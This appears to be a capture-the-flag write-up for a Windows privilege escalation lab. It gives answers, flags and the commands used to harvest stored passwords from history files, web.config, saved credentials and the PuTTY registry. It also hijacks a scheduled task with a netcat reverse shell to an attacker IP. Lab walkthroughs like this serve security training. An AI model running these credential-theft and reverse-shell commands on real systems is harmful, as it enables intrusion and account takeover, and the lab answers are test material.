# Windows Privilege Escalation

### Windows Privilege Escalation
- Users that can change system configurations are part of which group? `Administrators`
- The SYSTEM account has more privileges than the Administrator user (aye/nay) `aye`

### Harvesting Passwords from Usual Spots
- A password for the julia.jones user has been left on the Powershell history. What is the password? <br />
Open powershell and run: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`<br />
![image](https://github.com/user-attachments/assets/e4b7008f-1c12-4681-9215-9e4f01753be4)<br />
`ZuperCkretPa5z`
- A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user? <br />
Run the following command: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString` <br />
![image](https://github.com/user-attachments/assets/8395e424-e937-47e8-8fa4-85716d494cf9)<br />
`098n0x35skjD3`
- There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop. <br />
![image](https://github.com/user-attachments/assets/f30bfd39-b6fa-430c-ae6d-3f29f573f0e1)<br />
So let's open a terminal with these credentials; run `runas /savecred /user:mike.katz cmd.exe`: and get the flag <br />
![image](https://github.com/user-attachments/assets/a507f4b3-23e7-4ce5-8048-5b235a5f0d18)<br />
`THM{WHAT_IS_MY_PASSWORD}`
- Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user? <br />
Run `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`: <br />
![image](https://github.com/user-attachments/assets/ee75771b-193b-4717-a68a-f3d76558bfd0)<br />
`CoolPass2021`

### Other Quick Wins
- What is the taskusr1 flag?<br />
If we run `schtasks /query /tn vulntask /fo list /v`:<br />
![image](https://github.com/user-attachments/assets/3642d6aa-877b-4223-bcad-b22e79dc94af)<br >
we can see the same scheduled file described in this task. So let's just follow the steps. So, set up a netcat listener on your attackbox with `nc -lnvp 4444`. Now modify the scheduled task with the following command: `echo c:\tools\nc64.exe -e cmd.exe 10.10.192.202 4444 > C:\tasks\schtask.bat` (Remember to run this on cmd, not powershell). <br />
Now we can run the task with the following command `schtasks /run /tn vulntask` to spawn a reverse shell: <br />
![image](https://github.com/user-attachments/assets/0726bbbc-3910-4a5a-9361-f3a79b677f5a)<br />
So we can get the flag: <br />
![image](https://github.com/user-attachments/assets/6fd04d11-a13f-4f30-8796-5ff2cb5920c1)<br />


### 

### 

### 

### 

### 
